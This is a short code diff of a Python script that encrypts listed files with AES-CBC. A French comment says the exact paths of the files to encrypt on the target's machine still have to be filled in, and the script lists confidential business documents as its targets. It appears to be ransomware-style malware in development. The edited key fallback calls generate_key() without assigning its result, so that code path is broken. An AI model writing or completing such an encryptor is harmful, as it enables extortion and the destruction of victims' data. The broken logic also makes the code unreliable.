@@ -2,7 +2,7 @@ import os
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
-from generate_key import save_key
+from generate_key import generate_key
 
 def load_key(keyfile_path):
     with open(keyfile_path, 'rb') as keyfile:
@@ -10,7 +10,7 @@ def load_key(keyfile_path):
 
 def encrypt_file(file_path, key):
     with open(file_path, 'rb') as f:
-        file_data = f.read()  # Lire le fichier en mode binaire
+        file_data = f.read()
     cipher = AES.new(key, AES.MODE_CBC)
     ciphertext = cipher.iv + cipher.encrypt(pad(file_data, AES.block_size))
     return ciphertext
@@ -29,9 +29,7 @@ if __name__ == '__main__':
     try:
         key = load_key(keyfile_path)
     except Exception as e:
-        print(f"Error loading key: {e}")
-        key = get_random_bytes(32)
-        save_key(key, keyfile_path)
+        generate_key()
         
     # Ici on devra mettre le path exact des fichiers qu'on cherche à chiffrer chez la cible
     files_to_encrypt = ["dossier_confidentiel/Contrat_de_Prestation.docx", "dossier_confidentiel/Achats_Fournitures.xlsx"]
